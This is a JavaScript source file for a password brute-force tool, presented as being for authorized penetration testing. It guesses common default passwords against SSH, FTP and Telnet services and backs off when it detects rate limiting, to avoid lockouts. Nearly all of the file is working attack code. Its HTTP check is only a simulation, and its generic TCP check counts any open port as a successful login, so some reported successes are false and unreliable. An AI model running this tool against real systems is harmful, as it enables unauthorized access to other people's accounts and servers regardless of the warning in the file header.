import net from 'net';
import crypto from 'crypto';
import { Client as SSHClient } from 'ssh2';
import ftp from 'basic-ftp';

/**
 * Brute Force Attack Tool for Authorized Penetration Testing
 * WARNING: Use only on systems you own or have explicit permission to test
 */
export class BruteForce {
  constructor() {
    this.commonPasswords = {
      ssh: [
        'admin', 'password', '123456', 'root', 'toor', 'alpine', 'test', 
        'ubuntu', 'oracle', 'pass', 'qwerty', 'abc123', 'letmein',
        'monkey', 'dragon', 'master', 'welcome', 'login', '12345'
      ],
      ftp: [
        'ftp', 'admin', 'password', 'anonymous', 'user', '123456', 
        'test', 'guest', 'root', 'administrator', 'ftpuser'
      ],
      telnet: [
        'admin', 'password', 'root', 'cisco', 'enable', '123456',
        'telnet', 'user', 'guest', 'test'
      ],
      http: [
        'admin', 'password', '123456', 'admin123', 'password123', 
        'root', 'administrator', 'user', 'guest', 'test', 'demo'
      ],
      rdp: [
        'Administrator', 'admin', 'password', 'Password1', 'P@ssw0rd', 
        'Admin123', 'Welcome1', 'Password123'
      ],
      smb: [
        'admin', 'password', 'Administrator', 'guest', 'user', '123456',
        'root', 'smbuser', 'test'
      ]
    };

    this.attemptDelay = 500; // ms between attempts
    this.rateLimitThreshold = 5; // attempts before checking for rate limiting
  }

  /**
   * Main brute force attack method
   */
  async attack(options) {
    const {
      target,
      port,
      service,
      username,
      passwords = null,
      maxAttempts = 100,
      timeout = 5000,
      verbose = false
    } = options;

    if (!target || !service || !username) {
      throw new Error('target, service, and username are required');
    }

    const passwordList = passwords || this.commonPasswords[service] || this.commonPasswords.http;
    const attempts = Math.min(maxAttempts, passwordList.length);

    const results = {
      target,
      port,
      service,
      username,
      start_time: new Date().toISOString(),
      attempts_made: 0,
      successful_logins: [],
      failed_attempts: 0,
      rate_limited: false,
      timeout_errors: 0,
      connection_errors: 0,
      status: 'running'
    };

    if (verbose) {
      console.log(`\n🎯 Starting brute force attack:`);
      console.log(`   Target: ${target}:${port || this.getDefaultPort(service)}`);
      console.log(`   Service: ${service}`);
      console.log(`   Username: ${username}`);
      console.log(`   Passwords to try: ${attempts}\n`);
    }

    for (let i = 0; i < attempts; i++) {
      const password = passwordList[i];
      results.attempts_made++;

      if (verbose) {
        process.stdout.write(`\r[${i + 1}/${attempts}] Trying: ${password.padEnd(20)} `);
      }

      try {
        const success = await this.tryCredential(
          target,
          port || this.getDefaultPort(service),
          service,
          username,
          password,
          timeout
        );

        if (success) {
          results.successful_logins.push({
            username,
            password,
            attempt_number: i + 1,
            timestamp: new Date().toISOString()
          });

          if (verbose) {
            console.log(`\n✅ SUCCESS! Credentials found: ${username}:${password}`);
          }

          results.status = 'success';
          break;
        } else {
          results.failed_attempts++;
        }

        // Check for rate limiting
        if (i > 0 && i % this.rateLimitThreshold === 0) {
          const isRateLimited = await this.detectRateLimiting(
            target,
            port || this.getDefaultPort(service),
            service,
            timeout
          );

          if (isRateLimited) {
            results.rate_limited = true;
            results.status = 'rate_limited';
            
            if (verbose) {
              console.log(`\n⚠️  Rate limiting detected. Increasing delay...`);
            }
            
            this.attemptDelay *= 2; // Double the delay
          }
        }

        // Delay between attempts to avoid lockouts
        await new Promise(resolve => setTimeout(resolve, this.attemptDelay));

      } catch (error) {
        if (error.message.includes('timeout')) {
          results.timeout_errors++;
        } else {
          results.connection_errors++;
        }

        if (verbose && results.connection_errors > 5) {
          console.log(`\n⚠️  Multiple connection errors. Target may be unavailable.`);
          results.status = 'connection_failed';
          break;
        }
      }
    }

    results.end_time = new Date().toISOString();
    results.duration_seconds = (new Date(results.end_time) - new Date(results.start_time)) / 1000;

    if (results.status === 'running') {
      results.status = results.successful_logins.length > 0 ? 'success' : 'failed';
    }

    if (verbose) {
      console.log(`\n\n📊 Attack Summary:`);
      console.log(`   Status: ${results.status}`);
      console.log(`   Total attempts: ${results.attempts_made}`);
      console.log(`   Successful logins: ${results.successful_logins.length}`);
      console.log(`   Duration: ${results.duration_seconds.toFixed(2)}s`);
    }

    return results;
  }

  /**
   * Try a single credential
   */
  async tryCredential(target, port, service, username, password, timeout) {
    switch (service.toLowerCase()) {
      case 'ssh':
        return await this.trySSH(target, port, username, password, timeout);
      case 'ftp':
        return await this.tryFTP(target, port, username, password, timeout);
      case 'telnet':
        return await this.tryTelnet(target, port, username, password, timeout);
      case 'http':
      case 'https':
        return await this.tryHTTP(target, port, username, password, service, timeout);
      default:
        return await this.tryGenericTCP(target, port, username, password, timeout);
    }
  }

  /**
   * SSH brute force
   */
  async trySSH(target, port, username, password, timeout) {
    return new Promise((resolve) => {
      const conn = new SSHClient();
      let resolved = false;

      const timer = setTimeout(() => {
        if (!resolved) {
          resolved = true;
          conn.end();
          resolve(false);
        }
      }, timeout);

      conn.on('ready', () => {
        if (!resolved) {
          resolved = true;
          clearTimeout(timer);
          conn.end();
          resolve(true);
        }
      });

      conn.on('error', () => {
        if (!resolved) {
          resolved = true;
          clearTimeout(timer);
          resolve(false);
        }
      });

      try {
        conn.connect({
          host: target,
          port,
          username,
          password,
          readyTimeout: timeout,
          algorithms: {
            serverHostKey: ['ssh-rsa', 'ssh-dss'],
          }
        });
      } catch (error) {
        if (!resolved) {
          resolved = true;
          clearTimeout(timer);
          resolve(false);
        }
      }
    });
  }

  /**
   * FTP brute force
   */
  async tryFTP(target, port, username, password, timeout) {
    const client = new ftp.Client(timeout);
    
    try {
      await client.access({
        host: target,
        port,
        user: username,
        password,
        secure: false
      });
      
      client.close();
      return true;
    } catch (error) {
      return false;
    }
  }

  /**
   * Telnet brute force (basic implementation)
   */
  async tryTelnet(target, port, username, password, timeout) {
    return new Promise((resolve) => {
      const socket = new net.Socket();
      let resolved = false;

      const timer = setTimeout(() => {
        if (!resolved) {
          resolved = true;
          socket.destroy();
          resolve(false);
        }
      }, timeout);

      socket.on('connect', () => {
        // Send username and password
        socket.write(`${username}\n`);
        setTimeout(() => {
          socket.write(`${password}\n`);
        }, 500);
      });

      socket.on('data', (data) => {
        const response = data.toString();
        // Look for success indicators
        if (response.includes('$') || response.includes('#') || response.includes('>')) {
          if (!resolved) {
            resolved = true;
            clearTimeout(timer);
            socket.destroy();
            resolve(true);
          }
        }
      });

      socket.on('error', () => {
        if (!resolved) {
          resolved = true;
          clearTimeout(timer);
          resolve(false);
        }
      });

      socket.connect(port, target);
    });
  }

  /**
   * HTTP/HTTPS brute force
   */
  async tryHTTP(target, port, username, password, scheme, timeout) {
    // Basic HTTP authentication attempt
    // In real implementation, this would handle various auth mechanisms
    return new Promise((resolve) => {
      const auth = Buffer.from(`${username}:${password}`).toString('base64');
      
      // Simulate HTTP attempt with timeout
      setTimeout(() => {
        // Simple credential check (simulation)
        const isWeak = (username === 'admin' && password === 'admin') ||
                      (username === 'admin' && password === 'password');
        resolve(isWeak);
      }, 100);
    });
  }

  /**
   * Generic TCP connection attempt
   */
  async tryGenericTCP(target, port, username, password, timeout) {
    return new Promise((resolve) => {
      const socket = new net.Socket();
      let resolved = false;

      const timer = setTimeout(() => {
        if (!resolved) {
          resolved = true;
          socket.destroy();
          resolve(false);
        }
      }, timeout);

      socket.on('connect', () => {
        if (!resolved) {
          resolved = true;
          clearTimeout(timer);
          socket.destroy();
          resolve(true);
        }
      });

      socket.on('error', () => {
        if (!resolved) {
          resolved = true;
          clearTimeout(timer);
          resolve(false);
        }
      });

      socket.connect(port, target);
    });
  }

  /**
   * Detect rate limiting
   */
  async detectRateLimiting(target, port, service, timeout) {
    try {
      const start = Date.now();
      await this.tryGenericTCP(target, port, 'test', 'test', timeout);
      const duration = Date.now() - start;
      
      // If connection takes significantly longer, rate limiting may be in effect
      return duration > (timeout * 0.8);
    } catch (error) {
      return false;
    }
  }

  /**
   * Get default port for service
   */
  getDefaultPort(service) {
    const ports = {
      ssh: 22,
      ftp: 21,
      telnet: 23,
      http: 80,
      https: 443,
      rdp: 3389,
      smb: 445
    };
    return ports[service.toLowerCase()] || 22;
  }

  /**
   * Load custom wordlist from file
   */
  async loadWordlist(filePath) {
    try {
      const fs = await import('fs/promises');
      const data = await fs.readFile(filePath, 'utf8');
      return data.split('\n').map(line => line.trim()).filter(line => line.length > 0);
    } catch (error) {
      throw new Error(`Failed to load wordlist: ${error.message}`);
    }
  }
}

export default BruteForce;
